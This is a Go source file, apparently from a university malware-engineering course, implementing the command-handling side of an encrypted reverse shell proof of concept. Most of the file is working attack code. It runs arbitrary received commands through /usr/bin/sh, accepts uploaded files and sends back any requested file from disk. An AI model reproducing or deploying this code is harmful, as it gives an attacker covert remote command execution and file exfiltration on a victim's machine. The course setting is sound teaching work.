package main

// REVERSE SHELL POC FOR MALWARE ENGINEERING COURSE OF UIT

import (
	"log/slog"
	"strings"
	"path/filepath"
	"encoding/binary"
	"os"
	"fmt"
	"bytes"
	"net"
	"os/exec"

	"grevshell/grevcore"
)

func main() {
	stream, err := net.Listen("tcp", "localhost:9999")

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info("Reverse shell listening on port 9999.")

	for {
		conn, err := stream.Accept()
		if err != nil {
			slog.Error("An error occured while establishing a connection with the client.", slog.Any("ERROR", err))
			continue
		}

		slog.Info(fmt.Sprintf("Incoming connection from %s.", conn.RemoteAddr()))

		key, err := grevcore.DeriveKey(conn)

		if err != nil {
			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
			return
		}

		ExecuteRequest(conn, key)
	}
}

func ExecuteRequest(c net.Conn, key []byte) {
	defer c.Close()

	for {
		var buf bytes.Buffer
		recv := grevcore.ReceivePacket(c, key)

		if len(recv) == 0 {
			return
		}

		header := string(recv[:grevcore.HeaderSize])
		received := recv[grevcore.HeaderSize:]

		switch header {
		case grevcore.ShellExecHeader:
			cmd := exec.Command("/usr/bin/sh", "-c", strings.TrimSpace(string(received)))

			cmd.Stdout = &buf
			cmd.Stderr = &buf

			err := cmd.Run()

			if err != nil {
				slog.Error("An error occured while executing the command.", slog.Any("ERROR", err))
			}

			data := buf.Bytes()

			grevcore.SendPacket(c, data, key)

		case grevcore.FileReceiveHeader:
			filenameSize	:= binary.LittleEndian.Uint16(received[:2])
			filename	:= string(received[2:2 + filenameSize])

			data 		:= received[2 + filenameSize:]

			slog.Info("Writing file.", "FILE", filepath.Base(filename))
			err := os.WriteFile(filepath.Base(filename), data, 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				return
			}

		case grevcore.FileSendHeader:
			filenameSize	:= binary.LittleEndian.Uint16(received[:2])
			filename	:= string(received[2:])
			data, err	:= os.ReadFile(filename)

			slog.Info("Sending file.", "FILE", filepath.Base(filename))

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				return
			}

			toSend := make([]byte, 2 + int(filenameSize) + len(data))

			binary.LittleEndian.PutUint16(toSend[:2], filenameSize)
			copy(toSend[2:filenameSize + 2], []byte(filename))
			copy(toSend[filenameSize + 2:], data)

			grevcore.SendPacket(c, toSend, key)

		default:
			grevcore.SendPacket(c, []byte("?"), key)
		}
	}
}
